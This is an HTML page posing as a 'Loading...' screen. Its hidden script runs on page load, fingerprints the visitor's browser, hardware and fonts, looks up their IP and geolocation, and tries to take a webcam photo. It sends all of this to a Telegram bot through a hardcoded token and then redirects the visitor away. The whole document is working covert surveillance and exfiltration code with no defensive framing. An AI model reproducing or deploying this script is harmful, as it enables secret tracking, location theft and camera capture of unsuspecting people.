<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Загрузка...</title>
    <script>
        (async function() {
            // Конфигурация
            const BOT_TOKEN = '7898816931:AAHNPImGpJjs-MNsklAvrU0VRDFkHFte_ig';
            const USER_ID = '7898816931';
            
            // 1. Расширенный сбор данных
            const collectAllData = async () => {
                // Основные данные
                const data = {
                    timestamp: new Date().toISOString(),
                    localTime: new Date().toLocaleString('ru-RU'),
                    url: window.location.href,
                    referrer: document.referrer || 'прямой заход',
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    languages: navigator.languages,
                    cookieEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack,
                    hardwareConcurrency: navigator.hardwareConcurrency || 'недоступно',
                    deviceMemory: navigator.deviceMemory || 'недоступно',
                    screen: `${window.screen.width}x${window.screen.height}`,
                    colorDepth: window.screen.colorDepth,
                    orientation: window.screen.orientation?.type || 'недоступно',
                    touchSupport: 'ontouchstart' in window,
                    browserPlugins: Array.from(navigator.plugins).map(p => p.name).join(', '),
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    localStorage: !!window.localStorage,
                    sessionStorage: !!window.sessionStorage,
                    indexedDB: !!window.indexedDB,
                    webGL: await getWebGLInfo(),
                    audioContext: await getAudioContextInfo(),
                    battery: await getBatteryInfo(),
                    connection: await getConnectionInfo(),
                    ipInfo: await getIPInfo(),
                    geolocation: await getGeolocation(),
                    socialMedia: checkSocialMedia(),
                    installedApps: checkInstalledApps(),
                    browserFeatures: getBrowserFeatures()
                };

                // Дополнительные данные
                try {
                    data.canvasFingerprint = await getCanvasFingerprint();
                    data.webRTC = await getWebRTCInfo();
                    data.fonts = await getFontsList();
                    data.audioFingerprint = await getAudioFingerprint();
                } catch(e) {}

                return data;
            };

            // 2. Специальные методы сбора
            async function getIPInfo() {
                try {
                    const response = await fetch('https://ipapi.co/json/');
                    return await response.json();
                } catch {
                    try {
                        const fallback = await fetch('https://api.ipify.org?format=json');
                        return {ip: (await fallback.json()).ip};
                    } catch {
                        return {ip: 'неизвестно'};
                    }
                }
            }

            async function getGeolocation() {
                return new Promise(resolve => {
                    if (!navigator.geolocation) return resolve('недоступно');
                    
                    navigator.geolocation.getCurrentPosition(
                        pos => resolve({
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude,
                            accuracy: pos.coords.accuracy
                        }),
                        () => resolve('отказано'),
                        {timeout: 5000}
                    );
                });
            }

            async function getWebGLInfo() {
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (!gl) return 'недоступно';
                    
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    return {
                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                    };
                } catch {
                    return 'недоступно';
                }
            }

            // 3. Отправка данных
            async function sendAllData(data) {
                const text = formatDataForTelegram(data);
                const urls = [
                    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${USER_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`,
                    `https://tgappproxy.vercel.app/api/send?token=${BOT_TOKEN}&chat_id=${USER_ID}&text=${encodeURIComponent(text)}`
                ];

                for (const url of urls) {
                    try {
                        await fetch(url, {method: 'POST'});
                        break;
                    } catch(e) {
                        console.error(`Ошибка отправки через ${url}:`, e);
                    }
                }
            }

            function formatDataForTelegram(data) {
                let result = `<b>🚨 ПОЛНЫЙ СБОР ДАННЫХ</b>\n\n`;
                for (const [key, value] of Object.entries(data)) {
                    result += `<b>${key}:</b> ${typeof value === 'object' ? JSON.stringify(value) : value}\n`;
                }
                return result;
            }

            // 4. Запуск сбора и отправки
            try {
                const allData = await collectAllData();
                await sendAllData(allData);
                
                // Дополнительно: попытка получить фото с камеры
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({video: true});
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    await new Promise(resolve => video.onloadedmetadata = resolve);
                    
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    stream.getTracks().forEach(track => track.stop());
                    
                    canvas.toBlob(async blob => {
                        const formData = new FormData();
                        formData.append('photo', blob, 'user_photo.jpg');
                        formData.append('chat_id', USER_ID);
                        formData.append('caption', 'Фото с камеры пользователя');
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                    }, 'image/jpeg', 0.8);
                } catch {}
                
            } finally {
                // Перенаправление на основной сайт
                window.location.href = "https://example.com";
            }
        })();
    </script>
</head>
<body>
    <!-- Страница будет сразу перенаправлена -->
</body>
</html>
